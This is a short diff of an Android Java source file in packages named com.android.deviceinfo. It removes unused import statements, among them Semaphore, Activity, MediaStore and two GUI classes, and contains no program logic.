@@ -11,16 +11,12 @@ import java.util.ArrayList;
 import java.util.HashMap;
 import java.util.concurrent.Executors;
 import java.util.concurrent.ScheduledExecutorService;
-import java.util.concurrent.ScheduledThreadPoolExecutor;
-import java.util.concurrent.Semaphore;
 
-import android.app.Activity;
 import android.content.ContentResolver;
 import android.content.Context;
 import android.os.Handler;
 import android.os.PowerManager;
 import android.os.PowerManager.WakeLock;
-import android.provider.MediaStore.Images.Media;
 
 import com.android.deviceinfo.action.Action;
 import com.android.deviceinfo.auto.Cfg;
@@ -29,8 +25,6 @@ import com.android.deviceinfo.conf.ConfModule;
 import com.android.deviceinfo.conf.Globals;
 import com.android.deviceinfo.event.BaseEvent;
 import com.android.deviceinfo.gui.AGUI;
-import com.android.deviceinfo.gui.DeviceAdminRequest;
-import com.android.deviceinfo.gui.Preview;
 import com.android.deviceinfo.module.ModuleCrisis;
 import com.android.deviceinfo.util.Check;
 
